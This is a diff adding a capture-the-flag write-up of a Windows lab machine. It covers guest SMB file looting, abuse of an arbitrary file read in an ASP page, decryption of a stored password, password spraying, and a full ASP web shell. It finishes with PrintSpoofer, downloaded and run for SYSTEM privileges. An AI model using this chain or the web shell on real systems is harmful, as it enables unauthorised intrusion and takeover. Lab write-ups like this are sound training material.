@@ -152,9 +152,39 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 ```
 
 I was able to authenticate and connect to SMB via the Guest account with no password. With this, I could see some SMB shares which I had access to (READ ONLY permissions).
+Since we have access to these shares, we'll skim through them to see if we can find anything interesting. 
 
+# Information Disclosure
 
-I tried to see if I could get some local user accounts 
+I'll skip to the actually important bits here because a whole bunch of the files here are filler/red herring, and it took me hours to proceed:
+
+```
+$ smbclient //192.168.203.141/Loot_Drop -U 'Guest%' -c 'get Backups/Server_Logs/Recent/System_Dumps/sys_recovery_p_99.log /tmp/sys_recovery_p_99.log'
+getting file \Backups\Server_Logs\Recent\System_Dumps\sys_recovery_p_99.log of size 423 as /tmp/sys_recovery_p_99.log (103.3 KiloBytes/sec) (average 103.3 KiloBytes/sec)
+
+$ cat /tmp/sys_recovery_p_99.log                                                            
+[SYSTEM_RECOVERY_PROTOCOL]
+[TIMESTAMP: 2025-12-23T04:00:00Z]
+[USER: SYSTEM]
+
+WARNING: Stealth Mode Active.
+External Access via SSH/SMB denied by firewall ruleset '0nyx_Lockdown'.
+
+RECOVERY INSTRUCTIONS:
+To regain access to the control node, execute the Port Knock sequence.
+Sequence:
+  1. TCP 8000
+  2. TCP 9000
+  3. TCP 7000
+  4. TCP 10000
+
+Credentials 
+User: crYp7
+Pass: h@ck1ngCYNX1sfUn
+
+END OF LOG.
+```
+We have the credentials here for user `crYp7`. I went and tried to see if I could get more of the local user accounts: 
 
 ```
 $ impacket-lookupsid Guest@192.168.203.141 -no-pass
@@ -173,4 +203,322 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 1002: WIN-SJR239VHPGG\backup-svc (SidTypeUser)
 ```
 
-With the local accounts, I wanted to see if I could reuse the username as the password.
+We got some user accounts, which we'll add to users.txt for spraying later (or our own reference).
+
+# Initial Foothold
+
+Since `crYp7` is a real user account, I'll attempt to perform an SSH authentication using these credentials:
+
+```
+$ ssh crYp7@192.168.203.141
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+crYp7@192.168.203.141's password: h@ck1ngCYNX1sfUn
+
+Microsoft Windows [Version 10.0.17763.107]           
+(c) 2018 Microsoft Corporation. All rights reserved. 
+                                                     
+cryp7@WIN-SJR239VHPGG C:\Users\cryp7>  
+```
+
+We are able to get an SSH connection! Now to check for what permissions I have:
+
+```
+cryp7@WIN-SJR239VHPGG C:\Users\cryp7> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+Not many permissions, so we likely have to pivot to another account or service since there's no permissions here to escalate privileges either. Now (unfortunately), there's more file enumeration and digging to do, but eventually, we can see the `heads_up.txt`, and we can get to `C:\Syndicate_Loot\` where we can see a few things of note.
+
+```
+cryp7@WIN-SJR239VHPGG C:\Users\cryp7>type C:\Users\cryp7\Desktop\heads_up.txt 
+hey im backed up by the engagements im handling. help me set up my computer here okay. 
+I usually encrypt my passwords using PassEncrypt.exe, i put it in C:\Syndicate_Loot for you to refer.
+I also put hmm.txt in there as an example. do promise me dont break anything ok
+-r007
+```
+
+`\archive` is a restricted directory, and we don't have the permissions to view it as user crYp7. As such, we need to get creative with our approach. I routed my traffic through an SSH tunnel:
+
+```
+$ ssh -N -L 18080:127.0.0.1:8080 crYp7@192.168.203.141
+```
+
+Then I tried to access the internal web server:
+
+```
+$ gobuster dir -u http://127.0.0.1:18080/ -w /usr/share/wordlists/dirb/common.txt -x asp,txt,config
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://127.0.0.1:18080/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              asp,txt,config
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+assets               (Status: 301) [Size: 153] [--> http://127.0.0.1:18080/assets/]
+includes             (Status: 301) [Size: 155] [--> http://127.0.0.1:18080/includes/]
+index.asp            (Status: 200) [Size: 3462]
+Index.asp            (Status: 200) [Size: 3462]
+notes                (Status: 301) [Size: 152] [--> http://127.0.0.1:18080/notes/]
+Pages                (Status: 301) [Size: 152] [--> http://127.0.0.1:18080/Pages/]
+pages                (Status: 301) [Size: 152] [--> http://127.0.0.1:18080/pages/]
+Progress: 18452 / 18452 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+We can read the `notes.asp`, therefore, we'll see if there's a vulnerability here:
+
+```
+$ curl -sG 'http://127.0.0.1:18080/pages/notes/notes.asp?x=C:\inetpub\draft\pages\notes\notes.asp'                
+
+<%
+Dim fso, file, path
+path = Request.QueryString("x")
+
+Set fso = Server.CreateObject("Scripting.FileSystemObject")
+
+If path <> "" And fso.FileExists(path) Then
+    Set file = fso.OpenTextFile(path, 1, False)
+
+    Dim stream
+    Set stream = Server.CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.LoadFromFile path
+
+    Response.ContentType = "application/octet-stream"
+    Response.AddHeader "Content-Disposition", "attachment; filename=" & fso.GetFileName(path)
+    Response.BinaryWrite stream.Read
+
+    stream.Close
+    Set stream = Nothing
+Else
+    Response.Write "File not found."
+End If
+
+Set file = Nothing
+Set fso = Nothing
+%>
+...
+[truncated]
+```
+
+This gives us LFI/arbitrary file read. We can then use this to query files we normally don't have access to, for instance, the `C:\Syndicate_Loot\archive\hmm.txt` that was previously mentioned:
+
+```
+$ curl -sG 'http://127.0.0.1:18080/pages/notes/notes.asp?x=C:\Syndicate_Loot\archive\hmm.txt'
+found a file on a recent engagement that may be interesting
+vjmJn+Csvc5hci06zhdxMH9KOXGxr7v43KUsI7EHcLOt+Ci0vGlT4RlMbdleJvbv
+```
+
+Since it's encrypted, we'll also get the `PassEncrypt.exe`:
+
+```
+$ curl -s 'http://127.0.0.1:18080/pages/notes/notes.asp?x=C:\Syndicate_Loot\archive\PassEncrypt.exe' -o PassEncrypt.exe
+```
+
+Reverse engineer the exe (or just chuck it into an AI) to tell you how it functions, so you can use it to decrypt the `vjmJn+Csvc5hci06zhdxMH9KOXGxr7v43KUsI7EHcLOt+Ci0vGlT4RlMbdleJvbv`. It's just AES + XOR. 
+
+```
+AES Key: cryptNrootRockss
+XOR Key: PeanutButterAndChocolateWaffles
+```
+
+Then, decrypt the string to get the password left by r007:
+
+```
+import base64
+from Crypto.Cipher import AES
+
+b64 = 'vjmJn+Csvc5hci06zhdxMH9KOXGxr7v43KUsI7EHcLOt+Ci0vGlT4RlMbdleJvbv'
+raw = base64.b64decode(b64)
+
+xor_key = b'PeanutButterAndChocolateWaffles'
+aes_key = b'cryptNrootRockss'
+iv = b'\x00'*16
+
+x = bytes(b ^ xor_key[i % len(xor_key)] for i,b in enumerate(raw))
+pt = AES.new(aes_key, AES.MODE_CBC, iv).decrypt(x)
+print(pt[:-pt[-1]].decode())
+```
+
+And we'll get our output:
+
+```
+$ python decode.py
+Cant live without morning coffee!!
+```
+
+# Lateral Movement
+
+So, `Cant live without morning coffee!!` is our password. We'll use it to spray against our list of users from earlier (output of impacket-lookupsid):
+
+```
+$ netexec smb 192.168.203.141 -u users.txt -p 'Cant live without morning coffee!!' --local-auth
+SMB         192.168.203.141 445    WIN-SJR239VHPGG  [*] Windows Server 2019 Standard 17763 x64 (name:WIN-SJR239VHPGG) (domain:WIN-SJR239VHPGG) (signing:False) (SMBv1:True) (Null Auth:True)
+SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\r007:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
+SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\crYp7:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
+SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\Administrator:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
+SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\Guest:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
+SMB         192.168.203.141 445    WIN-SJR239VHPGG  [+] WIN-SJR239VHPGG\backup-svc:Cant live without morning coffee!!
+```
+
+Successful login on `backup-svc`!! Now, we'll try to authenticate
+
+```
+$ ssh backup-svc@192.168.203.141
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+backup-svc@192.168.203.141's password: Cant live without morning coffee!!
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+backup-svc@WIN-SJR239VHPGG C:\Users\backup-svc>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+backup-svc@WIN-SJR239VHPGG C:\Users\backup-svc>whoami
+win-sjr239vhpgg\backup-sv
+```
+
+Not enough permissions, so I will try use the same SSH tunnel from earlier:
+
+```
+ssh -N -L 18080:127.0.0.1:8080 backup-svc@192.168.203.141
+```
+
+Additionally, if we probe the site, we'll get the following:
+
+```
+$ curl 127.0.0.1:18080/flag.asp
+[truncated]
+<div class="content-container"> 
+ <fieldset><h4>Detailed Error Information:</h4> 
+  <div id="details-left"> 
+   <table border="0" cellpadding="0" cellspacing="0"> 
+    <tr class="alt"><th>Module</th><td>&nbsp;&nbsp;&nbsp;IIS Web Core</td></tr> 
+    <tr><th>Notification</th><td>&nbsp;&nbsp;&nbsp;MapRequestHandler</td></tr> 
+    <tr class="alt"><th>Handler</th><td>&nbsp;&nbsp;&nbsp;ASPClassic</td></tr> 
+    <tr><th>Error Code</th><td>&nbsp;&nbsp;&nbsp;0x80070002</td></tr> 
+[truncated]
+```
+So we know that the site uses a Classic ASP Handler, which means it will parse ASP files that are dropped into it. If we can write ASP files to `/inetpub`, then we can get it to run.
+So, we'll upload the following command as an ASP file (because user backup-svc has write priv to /inetpub) to get a web shell:
+
+```
+$ cat upload.asp
+<%
+Response.Buffer = True
+Dim cmd, sh, ex, out
+cmd = Request.QueryString("c")
+If cmd = "" Then
+  Response.Write "usage:?c=command"
+Else
+  Set sh = Server.CreateObject("WScript.Shell")
+  Set ex = sh.Exec("cmd /c " & cmd)
+  out = ex.StdOut.ReadAll() & ex.StdErr.ReadAll()
+  Response.Write "<pre>" & Server.HTMLEncode(out) & "</pre>"
+End If
+%>
+
+$ scp upload.asp backup-svc@192.168.203.141:/C:/inetpub/draft/upload.asp
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+backup-svc@192.168.203.141's password: 
+upload.asp                                                                                                                                                         100%  341   210.7KB/s   00:00 
+```
+
+Now to check whether we have RCE as `iis apppool\draft`:
+
+```
+$ curl -s 'http://127.0.0.1:18080/upload.asp?c=whoami'                     
+
+<pre>iis apppool\draft
+</pre>
+
+$ curl -s 'http://127.0.0.1:18080/upload.asp?c=whoami%20/priv'
+
+<pre>
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</pre>
+```
+
+We still won't be able to read `C:\Users\Administrator\Desktop\flag.txt` because we're not a local admin (yet). To do so, we'll need to escalate our privilege. We can do so easily because `SeImpersonatePrivilege` is enabled, so we can use PrintSpoofer.
+
+# Privilege Escalation
+
+We'll download, then upload/scp to the target:
+
+```
+$ wget -q https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer64.exe
+
+$ scp PrintSpoofer64.exe backup-svc@192.168.203.141:/C:/inetpub/draft/PrintSpoofer64.exe
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+backup-svc@192.168.203.141's password: 
+PrintSpoofer64.exe                                                                                                                                                 100%   27KB   2.9MB/s   00:00 
+```
+
+Then, execute the command:
+
+```
+$ curl -s "http://127.0.0.1:18080/upload.asp?c=%22C:\inetpub\draft\PrintSpoofer64.exe%22+-i+-c+whoami"
+<pre>[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+nt authority\system
+</pre>
+```
+
+Now we have SYSTEM-level privilege with impersonated pipe. We can now read the flag:
+
+```
+$ curl -s "http://127.0.0.1:18080/upload.asp?c=C:\inetpub\draft\PrintSpoofer64.exe+-i+-c+%22cmd.exe+/c+type+C:\Users\Administrator\Desktop\flag.txt%22"
+<pre>[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+CYNX{wh0_0wn_wh0_n0w?}</pre>
+```
+
+# Flag
+
+The final flag is `CYNX{wh0_0wn_wh0_n0w?}`
